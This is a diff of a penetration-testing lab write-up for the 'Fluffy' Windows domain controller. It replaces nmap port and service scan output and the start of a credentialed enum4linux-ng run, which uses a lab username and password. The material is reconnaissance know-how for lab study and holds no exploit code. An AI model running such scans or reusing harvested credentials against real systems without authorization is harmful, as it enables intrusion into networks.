@@ -17,64 +17,303 @@ Let’s dive into the belly of the beast.
 Let's start with a full nmap scan. Generally, especially for more complex machines that require more time, I open additional tabs in my terminal simultaneously to begin enumeration. A great tool that allows for an initial comprehensive enumeration is enum4linux-ng. Below are some of the results:
 
 ```bash
-┌──(urielsg㉿Kali)-[~/Scrivania/FLUFFY]
-└─$ nmap -sC -sV -p- -T4 10.10.11.69
-Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-26 00:11 CEST
-Nmap scan report for 10.10.11.69
-Host is up (0.12s latency).
+┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-pzeors8as1]─[~]
+└──╼ [★]$ nmap -p- --min-rate 10000 10.129.232.88
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-04 09:31 CDT
+Nmap scan report for 10.129.232.88
+Host is up (0.0078s latency).
 Not shown: 65516 filtered tcp ports (no-response)
-PORT      STATE SERVICE       VERSION
-53/tcp    open  domain        Simple DNS Plus
-88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-26 05:16:01Z)
-139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
-389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
-| ssl-cert: Subject: commonName=DC01.fluffy.htb
-| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
-| Not valid before: 2025-04-17T16:04:17
-|_Not valid after:  2026-04-17T16:04:17
-|_ssl-date: 2025-05-26T05:17:32+00:00; +6h59m59s from scanner time.
-445/tcp   open  microsoft-ds?
-464/tcp   open  kpasswd5?
-593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
-| ssl-cert: Subject: commonName=DC01.fluffy.htb
-| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
-| Not valid before: 2025-04-17T16:04:17
-|_Not valid after:  2026-04-17T16:04:17
-|_ssl-date: 2025-05-26T05:17:33+00:00; +6h59m59s from scanner time.
-3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
-|_ssl-date: 2025-05-26T05:17:32+00:00; +6h59m59s from scanner time.
-| ssl-cert: Subject: commonName=DC01.fluffy.htb
-| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
-| Not valid before: 2025-04-17T16:04:17
-|_Not valid after:  2026-04-17T16:04:17
-3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
-|_ssl-date: 2025-05-26T05:17:33+00:00; +6h59m59s from scanner time.
-| ssl-cert: Subject: commonName=DC01.fluffy.htb
-| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
-| Not valid before: 2025-04-17T16:04:17
-|_Not valid after:  2026-04-17T16:04:17
-5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+49666/tcp open  unknown
+49685/tcp open  unknown
+49686/tcp open  unknown
+49692/tcp open  unknown
+49708/tcp open  unknown
+49722/tcp open  unknown
+49744/tcp open  unknown
+
+┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-pzeors8as1]─[~]
+└──╼ [★]$ nmap -p 53,88,139,389,445,464,593,636,3268,3269,5985 -vv -sCV 10.129.232.88
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-04 09:33 CDT
+NSE: Loaded 156 scripts for scanning.
+NSE: Script Pre-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 09:33
+Completed NSE at 09:33, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 09:33
+Completed NSE at 09:33, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 09:33
+Completed NSE at 09:33, 0.00s elapsed
+Initiating Ping Scan at 09:33
+Scanning 10.129.232.88 [4 ports]
+Completed Ping Scan at 09:33, 0.05s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 09:33
+Completed Parallel DNS resolution of 1 host. at 09:33, 0.00s elapsed
+Initiating SYN Stealth Scan at 09:33
+Scanning 10.129.232.88 [11 ports]
+Discovered open port 53/tcp on 10.129.232.88
+Discovered open port 3269/tcp on 10.129.232.88
+Discovered open port 593/tcp on 10.129.232.88
+Discovered open port 445/tcp on 10.129.232.88
+Discovered open port 88/tcp on 10.129.232.88
+Discovered open port 139/tcp on 10.129.232.88
+Discovered open port 389/tcp on 10.129.232.88
+Discovered open port 5985/tcp on 10.129.232.88
+Discovered open port 636/tcp on 10.129.232.88
+Discovered open port 464/tcp on 10.129.232.88
+Discovered open port 3268/tcp on 10.129.232.88
+Completed SYN Stealth Scan at 09:33, 0.03s elapsed (11 total ports)
+Initiating Service scan at 09:33
+Scanning 11 services on 10.129.232.88
+Completed Service scan at 09:34, 44.71s elapsed (11 services on 1 host)
+NSE: Script scanning 10.129.232.88.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 09:34
+NSE Timing: About 99.93% done; ETC: 09:34 (0:00:00 remaining)
+Completed NSE at 09:34, 40.20s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 09:34
+Completed NSE at 09:34, 1.24s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 09:34
+Completed NSE at 09:34, 0.00s elapsed
+Nmap scan report for 10.129.232.88
+Host is up, received echo-reply ttl 127 (0.0080s latency).
+Scanned at 2026-05-04 09:33:28 CDT for 87s
+
+PORT     STATE SERVICE       REASON          VERSION
+53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
+88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-05-04 21:33:34Z)
+139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
+389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
+|_ssl-date: 2026-05-04T21:34:54+00:00; +7h00m00s from scanner time.
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
+| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2026-04-30T16:09:59
+| Not valid after:  2106-04-30T16:09:59
+| MD5:   f5e3:ec00:5fd1:2a95:a76b:2fd6:4726:4d67
+| SHA-1: 6867:9230:5123:dcf1:9352:e081:4148:7fef:13c7:6c0a
+| -----BEGIN CERTIFICATE-----
+| MIIFmjCCBIKgAwIBAgITUAAAABHyG6GZUVLpIQACAAAAETANBgkqhkiG9w0BAQsF
+| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGZmx1ZmZ5
+| MRcwFQYDVQQDEw5mbHVmZnktREMwMS1DQTAgFw0yNjA0MzAxNjA5NTlaGA8yMTA2
+| MDQzMDE2MDk1OVowADCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALvc
+| 1vZo317xTcxldcffWWYLJsYtKuaYnf+etebicPU9eZc55NFzBQyfCM6BWPjbLuDQ
+| 0FFQFnQvYfKCNfX40kuxVKnW9VQm/dSJUfzt2Uz93GYKJEaJlQPDEFTKJdBaJTq1
+| BE13EzR389j8uBPDB+P8sVHSXau1IPspyB+UYWQUt4hGt5hOU6yydjao/d4B8LOl
+| OZGpnKr6ox67GWLqwCfoj8It/vSUN3xeFn3yFDqkI/RNhVF7fiqPYnad1nwycicV
+| tBPYKeOP6ZXFfqJs5lJLsLt8J708//iS28dEXFi4yUog+jNAuGf53QNuTviVbILG
+| SdPVr9IBpNh5zNlM9kkCAwEAAaOCAsMwggK/MDcGCSsGAQQBgjcVBwQqMCgGICsG
+| AQQBgjcVCIfOj3KD0etwhvWLD4Loh37CjReBWwEhAgFuAgEAMDIGA1UdJQQrMCkG
+| CCsGAQUFBwMCBggrBgEFBQcDAQYKKwYBBAGCNxQCAgYHKwYBBQIDBTAOBgNVHQ8B
+| Af8EBAMCBaAwQAYJKwYBBAGCNxUKBDMwMTAKBggrBgEFBQcDAjAKBggrBgEFBQcD
+| ATAMBgorBgEEAYI3FAICMAkGBysGAQUCAwUwHQYDVR0OBBYEFMG/WiZX49X4GWpl
+| oVa+O9XP64DrMB8GA1UdIwQYMBaAFLZo6VUJI0gwnx+vL8f7rAgMKn0RMIHIBgNV
+| HR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPWZsdWZmeS1EQzAxLUNBLENO
+| PURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZp
+| Y2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERDPWh0Yj9jZXJ0aWZpY2F0
+| ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9u
+| UG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6Ly8v
+| Q049Zmx1ZmZ5LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZp
+| Y2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERDPWh0
+| Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1
+| dGhvcml0eTAxBgNVHREBAf8EJzAlgg9EQzAxLmZsdWZmeS5odGKCCmZsdWZmeS5o
+| dGKCBkZMVUZGWTANBgkqhkiG9w0BAQsFAAOCAQEATryg0q2I2eVmPNwkxBcsaUFD
+| 0s/p3kv/aOCGB9Wv7TpLP+2WjPRBnGCg9JgrFSL6mvbTyvmftSrxyzGMbbMOyhs5
+| zCJrNE0ewzVeWtkE4HJx4P1rbrR1DvTmoZPKZ5y0NTQGCeHzM9vR8nVnFtMByHpG
+| /F3ReiaILeHnvRDVNjyd/uDkOu+mYNZ9k7kZLvMynM55YfizS6ZLXSqqVtLzUJev
+| l3szUURWnNtESHGkGrrclYaWakB3CO1ygkTTjV5O1UNj2V38wN8wgNX7Pys771PQ
+| mmZJw5lCPljYhiN3Rh/8vUlg6IQlJEsyAJL1Y9MuaTJOuyf2PZPCJURtKhgdiA==
+|_-----END CERTIFICATE-----
+445/tcp  open  microsoft-ds? syn-ack ttl 127
+464/tcp  open  kpasswd5?     syn-ack ttl 127
+593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2026-05-04T21:34:55+00:00; +7h00m00s from scanner time.
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
+| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2026-04-30T16:09:59
+| Not valid after:  2106-04-30T16:09:59
+| MD5:   f5e3:ec00:5fd1:2a95:a76b:2fd6:4726:4d67
+| SHA-1: 6867:9230:5123:dcf1:9352:e081:4148:7fef:13c7:6c0a
+| -----BEGIN CERTIFICATE-----
+| MIIFmjCCBIKgAwIBAgITUAAAABHyG6GZUVLpIQACAAAAETANBgkqhkiG9w0BAQsF
+| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGZmx1ZmZ5
+| MRcwFQYDVQQDEw5mbHVmZnktREMwMS1DQTAgFw0yNjA0MzAxNjA5NTlaGA8yMTA2
+| MDQzMDE2MDk1OVowADCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALvc
+| 1vZo317xTcxldcffWWYLJsYtKuaYnf+etebicPU9eZc55NFzBQyfCM6BWPjbLuDQ
+| 0FFQFnQvYfKCNfX40kuxVKnW9VQm/dSJUfzt2Uz93GYKJEaJlQPDEFTKJdBaJTq1
+| BE13EzR389j8uBPDB+P8sVHSXau1IPspyB+UYWQUt4hGt5hOU6yydjao/d4B8LOl
+| OZGpnKr6ox67GWLqwCfoj8It/vSUN3xeFn3yFDqkI/RNhVF7fiqPYnad1nwycicV
+| tBPYKeOP6ZXFfqJs5lJLsLt8J708//iS28dEXFi4yUog+jNAuGf53QNuTviVbILG
+| SdPVr9IBpNh5zNlM9kkCAwEAAaOCAsMwggK/MDcGCSsGAQQBgjcVBwQqMCgGICsG
+| AQQBgjcVCIfOj3KD0etwhvWLD4Loh37CjReBWwEhAgFuAgEAMDIGA1UdJQQrMCkG
+| CCsGAQUFBwMCBggrBgEFBQcDAQYKKwYBBAGCNxQCAgYHKwYBBQIDBTAOBgNVHQ8B
+| Af8EBAMCBaAwQAYJKwYBBAGCNxUKBDMwMTAKBggrBgEFBQcDAjAKBggrBgEFBQcD
+| ATAMBgorBgEEAYI3FAICMAkGBysGAQUCAwUwHQYDVR0OBBYEFMG/WiZX49X4GWpl
+| oVa+O9XP64DrMB8GA1UdIwQYMBaAFLZo6VUJI0gwnx+vL8f7rAgMKn0RMIHIBgNV
+| HR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPWZsdWZmeS1EQzAxLUNBLENO
+| PURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZp
+| Y2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERDPWh0Yj9jZXJ0aWZpY2F0
+| ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9u
+| UG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6Ly8v
+| Q049Zmx1ZmZ5LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZp
+| Y2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERDPWh0
+| Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1
+| dGhvcml0eTAxBgNVHREBAf8EJzAlgg9EQzAxLmZsdWZmeS5odGKCCmZsdWZmeS5o
+| dGKCBkZMVUZGWTANBgkqhkiG9w0BAQsFAAOCAQEATryg0q2I2eVmPNwkxBcsaUFD
+| 0s/p3kv/aOCGB9Wv7TpLP+2WjPRBnGCg9JgrFSL6mvbTyvmftSrxyzGMbbMOyhs5
+| zCJrNE0ewzVeWtkE4HJx4P1rbrR1DvTmoZPKZ5y0NTQGCeHzM9vR8nVnFtMByHpG
+| /F3ReiaILeHnvRDVNjyd/uDkOu+mYNZ9k7kZLvMynM55YfizS6ZLXSqqVtLzUJev
+| l3szUURWnNtESHGkGrrclYaWakB3CO1ygkTTjV5O1UNj2V38wN8wgNX7Pys771PQ
+| mmZJw5lCPljYhiN3Rh/8vUlg6IQlJEsyAJL1Y9MuaTJOuyf2PZPCJURtKhgdiA==
+|_-----END CERTIFICATE-----
+3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2026-05-04T21:34:54+00:00; +7h00m00s from scanner time.
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
+| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2026-04-30T16:09:59
+| Not valid after:  2106-04-30T16:09:59
+| MD5:   f5e3:ec00:5fd1:2a95:a76b:2fd6:4726:4d67
+| SHA-1: 6867:9230:5123:dcf1:9352:e081:4148:7fef:13c7:6c0a
+| -----BEGIN CERTIFICATE-----
+| MIIFmjCCBIKgAwIBAgITUAAAABHyG6GZUVLpIQACAAAAETANBgkqhkiG9w0BAQsF
+| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGZmx1ZmZ5
+| MRcwFQYDVQQDEw5mbHVmZnktREMwMS1DQTAgFw0yNjA0MzAxNjA5NTlaGA8yMTA2
+| MDQzMDE2MDk1OVowADCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALvc
+| 1vZo317xTcxldcffWWYLJsYtKuaYnf+etebicPU9eZc55NFzBQyfCM6BWPjbLuDQ
+| 0FFQFnQvYfKCNfX40kuxVKnW9VQm/dSJUfzt2Uz93GYKJEaJlQPDEFTKJdBaJTq1
+| BE13EzR389j8uBPDB+P8sVHSXau1IPspyB+UYWQUt4hGt5hOU6yydjao/d4B8LOl
+| OZGpnKr6ox67GWLqwCfoj8It/vSUN3xeFn3yFDqkI/RNhVF7fiqPYnad1nwycicV
+| tBPYKeOP6ZXFfqJs5lJLsLt8J708//iS28dEXFi4yUog+jNAuGf53QNuTviVbILG
+| SdPVr9IBpNh5zNlM9kkCAwEAAaOCAsMwggK/MDcGCSsGAQQBgjcVBwQqMCgGICsG
+| AQQBgjcVCIfOj3KD0etwhvWLD4Loh37CjReBWwEhAgFuAgEAMDIGA1UdJQQrMCkG
+| CCsGAQUFBwMCBggrBgEFBQcDAQYKKwYBBAGCNxQCAgYHKwYBBQIDBTAOBgNVHQ8B
+| Af8EBAMCBaAwQAYJKwYBBAGCNxUKBDMwMTAKBggrBgEFBQcDAjAKBggrBgEFBQcD
+| ATAMBgorBgEEAYI3FAICMAkGBysGAQUCAwUwHQYDVR0OBBYEFMG/WiZX49X4GWpl
+| oVa+O9XP64DrMB8GA1UdIwQYMBaAFLZo6VUJI0gwnx+vL8f7rAgMKn0RMIHIBgNV
+| HR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPWZsdWZmeS1EQzAxLUNBLENO
+| PURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZp
+| Y2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERDPWh0Yj9jZXJ0aWZpY2F0
+| ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9u
+| UG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6Ly8v
+| Q049Zmx1ZmZ5LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZp
+| Y2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERDPWh0
+| Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1
+| dGhvcml0eTAxBgNVHREBAf8EJzAlgg9EQzAxLmZsdWZmeS5odGKCCmZsdWZmeS5o
+| dGKCBkZMVUZGWTANBgkqhkiG9w0BAQsFAAOCAQEATryg0q2I2eVmPNwkxBcsaUFD
+| 0s/p3kv/aOCGB9Wv7TpLP+2WjPRBnGCg9JgrFSL6mvbTyvmftSrxyzGMbbMOyhs5
+| zCJrNE0ewzVeWtkE4HJx4P1rbrR1DvTmoZPKZ5y0NTQGCeHzM9vR8nVnFtMByHpG
+| /F3ReiaILeHnvRDVNjyd/uDkOu+mYNZ9k7kZLvMynM55YfizS6ZLXSqqVtLzUJev
+| l3szUURWnNtESHGkGrrclYaWakB3CO1ygkTTjV5O1UNj2V38wN8wgNX7Pys771PQ
+| mmZJw5lCPljYhiN3Rh/8vUlg6IQlJEsyAJL1Y9MuaTJOuyf2PZPCJURtKhgdiA==
+|_-----END CERTIFICATE-----
+3269/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
+| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2026-04-30T16:09:59
+| Not valid after:  2106-04-30T16:09:59
+| MD5:   f5e3:ec00:5fd1:2a95:a76b:2fd6:4726:4d67
+| SHA-1: 6867:9230:5123:dcf1:9352:e081:4148:7fef:13c7:6c0a
+| -----BEGIN CERTIFICATE-----
+| MIIFmjCCBIKgAwIBAgITUAAAABHyG6GZUVLpIQACAAAAETANBgkqhkiG9w0BAQsF
+| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGZmx1ZmZ5
+| MRcwFQYDVQQDEw5mbHVmZnktREMwMS1DQTAgFw0yNjA0MzAxNjA5NTlaGA8yMTA2
+| MDQzMDE2MDk1OVowADCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALvc
+| 1vZo317xTcxldcffWWYLJsYtKuaYnf+etebicPU9eZc55NFzBQyfCM6BWPjbLuDQ
+| 0FFQFnQvYfKCNfX40kuxVKnW9VQm/dSJUfzt2Uz93GYKJEaJlQPDEFTKJdBaJTq1
+| BE13EzR389j8uBPDB+P8sVHSXau1IPspyB+UYWQUt4hGt5hOU6yydjao/d4B8LOl
+| OZGpnKr6ox67GWLqwCfoj8It/vSUN3xeFn3yFDqkI/RNhVF7fiqPYnad1nwycicV
+| tBPYKeOP6ZXFfqJs5lJLsLt8J708//iS28dEXFi4yUog+jNAuGf53QNuTviVbILG
+| SdPVr9IBpNh5zNlM9kkCAwEAAaOCAsMwggK/MDcGCSsGAQQBgjcVBwQqMCgGICsG
+| AQQBgjcVCIfOj3KD0etwhvWLD4Loh37CjReBWwEhAgFuAgEAMDIGA1UdJQQrMCkG
+| CCsGAQUFBwMCBggrBgEFBQcDAQYKKwYBBAGCNxQCAgYHKwYBBQIDBTAOBgNVHQ8B
+| Af8EBAMCBaAwQAYJKwYBBAGCNxUKBDMwMTAKBggrBgEFBQcDAjAKBggrBgEFBQcD
+| ATAMBgorBgEEAYI3FAICMAkGBysGAQUCAwUwHQYDVR0OBBYEFMG/WiZX49X4GWpl
+| oVa+O9XP64DrMB8GA1UdIwQYMBaAFLZo6VUJI0gwnx+vL8f7rAgMKn0RMIHIBgNV
+| HR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPWZsdWZmeS1EQzAxLUNBLENO
+| PURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZp
+| Y2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERDPWh0Yj9jZXJ0aWZpY2F0
+| ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9u
+| UG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6Ly8v
+| Q049Zmx1ZmZ5LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZp
+| Y2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERDPWh0
+| Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1
+| dGhvcml0eTAxBgNVHREBAf8EJzAlgg9EQzAxLmZsdWZmeS5odGKCCmZsdWZmeS5o
+| dGKCBkZMVUZGWTANBgkqhkiG9w0BAQsFAAOCAQEATryg0q2I2eVmPNwkxBcsaUFD
+| 0s/p3kv/aOCGB9Wv7TpLP+2WjPRBnGCg9JgrFSL6mvbTyvmftSrxyzGMbbMOyhs5
+| zCJrNE0ewzVeWtkE4HJx4P1rbrR1DvTmoZPKZ5y0NTQGCeHzM9vR8nVnFtMByHpG
+| /F3ReiaILeHnvRDVNjyd/uDkOu+mYNZ9k7kZLvMynM55YfizS6ZLXSqqVtLzUJev
+| l3szUURWnNtESHGkGrrclYaWakB3CO1ygkTTjV5O1UNj2V38wN8wgNX7Pys771PQ
+| mmZJw5lCPljYhiN3Rh/8vUlg6IQlJEsyAJL1Y9MuaTJOuyf2PZPCJURtKhgdiA==
+|_-----END CERTIFICATE-----
+|_ssl-date: 2026-05-04T21:34:55+00:00; +7h00m00s from scanner time.
+5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 |_http-server-header: Microsoft-HTTPAPI/2.0
 |_http-title: Not Found
-9389/tcp  open  mc-nmf        .NET Message Framing
-49667/tcp open  msrpc         Microsoft Windows RPC
-49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-49678/tcp open  msrpc         Microsoft Windows RPC
-49681/tcp open  msrpc         Microsoft Windows RPC
-49695/tcp open  msrpc         Microsoft Windows RPC
-49703/tcp open  msrpc         Microsoft Windows RPC
-49732/tcp open  msrpc         Microsoft Windows RPC
 Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
 
 Host script results:
-|_clock-skew: mean: 6h59m58s, deviation: 0s, median: 6h59m58s
 | smb2-time: 
-|   date: 2025-05-26T05:16:53
+|   date: 2026-05-04T21:34:15
 |_  start_date: N/A
 | smb2-security-mode: 
 |   3:1:1: 
 |_    Message signing enabled and required
+|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 44288/tcp): CLEAN (Timeout)
+|   Check 2 (port 50481/tcp): CLEAN (Timeout)
+|   Check 3 (port 35164/udp): CLEAN (Timeout)
+|   Check 4 (port 6279/udp): CLEAN (Timeout)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 09:34
+Completed NSE at 09:34, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 09:34
+Completed NSE at 09:34, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 09:34
+Completed NSE at 09:34, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 86.57 seconds
+           Raw packets sent: 15 (636B) | Rcvd: 12 (512B)
+
 
 ```
 
@@ -95,12 +334,22 @@ As mentioned earlier, while Nmap was running, I started exploring other enumerat
 ## Enum4linux-ng
 
 ```bash
-┌──(urielsg㉿Kali)-[~/Scrivania/FLUFFY]
-└─$ enum4linux-ng -u 'j.fleischman' -p 'J0elTHEM4n1990!' 10.10.11.69
+┌─[eu-dedivip-1]─[10.10.14.98]─[justdave@htb-pzeors8as1]─[~]
+└──╼ [★]$ enum4linux-ng -u 'j.fleischman' -p 'J0elTHEM4n1990!' 10.129.232.88
+ENUM4LINUX - next generation (v1.3.4)
 
- ====================================
-|    Listener Scan on 10.10.11.69    |
- ====================================
+ ==========================
+|    Target Information    |
+ ==========================
+[*] Target ........... 10.129.232.88
+[*] Username ......... 'j.fleischman'
+[*] Random Username .. 'azjbaudg'
+[*] Password ......... 'J0elTHEM4n1990!'
+[*] Timeout .......... 5 second(s)
+
+ ======================================
+|    Listener Scan on 10.129.232.88    |
+ ======================================
 [*] Checking LDAP
 [+] LDAP is accessible on 389/tcp
 [*] Checking LDAPS
@@ -110,116 +359,365 @@ As mentioned earlier, while Nmap was running, I started exploring other enumerat
 [*] Checking SMB over NetBIOS
 [+] SMB over NetBIOS is accessible on 139/tcp
 
- ==========================================================
-|    Domain Information via SMB session for 10.10.11.69    |
- ==========================================================
+ =====================================================
+|    Domain Information via LDAP for 10.129.232.88    |
+ =====================================================
+[*] Trying LDAP
+[+] Appears to be root/parent DC
+[+] Long domain name is: fluffy.htb
+
+ ============================================================
+|    NetBIOS Names and Workgroup/Domain for 10.129.232.88    |
+ ============================================================
+[-] Could not get NetBIOS names information via 'nmblookup': timed out
+
+ ==========================================
+|    SMB Dialect Check on 10.129.232.88    |
+ ==========================================
+[*] Trying on 445/tcp
+[+] Supported dialects and settings:
+Supported dialects:
+  SMB 1.0: false
+  SMB 2.02: true
+  SMB 2.1: true
+  SMB 3.0: true
+  SMB 3.1.1: true
+Preferred dialect: SMB 3.0
+SMB1 only: false
+SMB signing required: true
+
+ ============================================================
+|    Domain Information via SMB session for 10.129.232.88    |
+ ============================================================
 [*] Enumerating via unauthenticated SMB session on 445/tcp
